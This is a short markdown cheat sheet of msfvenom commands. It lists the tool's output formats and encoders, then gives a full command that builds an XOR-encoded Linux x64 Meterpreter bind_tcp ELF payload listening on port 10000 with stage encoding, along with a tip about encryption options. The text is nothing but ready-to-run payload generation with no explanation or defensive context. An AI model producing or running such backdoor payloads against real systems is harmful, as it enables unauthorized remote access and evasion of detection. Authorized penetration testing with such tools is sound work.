# Lists
```sh
msfvenom --list formats
msfvenom --list encoders
```

# Meterpreter - Linux - bind_tcp
```sh
# --encrypt aes256 does not work for exe and elf
msfvenom -a x64 -e x64/xor_dynamic --platform Linux -p linux/x64/meterpreter/bind_tcp -f elf -o bind_tcp LPORT=10000 EnableStageEncoding=true
```
